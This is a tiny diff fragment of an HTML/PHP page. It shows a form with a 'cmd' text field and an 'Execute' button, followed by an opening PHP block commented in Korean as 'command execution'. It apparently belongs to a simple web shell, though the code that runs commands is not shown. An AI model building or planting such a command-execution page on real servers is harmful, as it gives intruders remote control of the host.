@@ -2,7 +2,6 @@
 <input type="TEXT" name="cmd" autofocus id="cmd" size="80">
 <input type="SUBMIT" value="Execute">
 </form>
-
 <?php
 
     // 명령어 실행
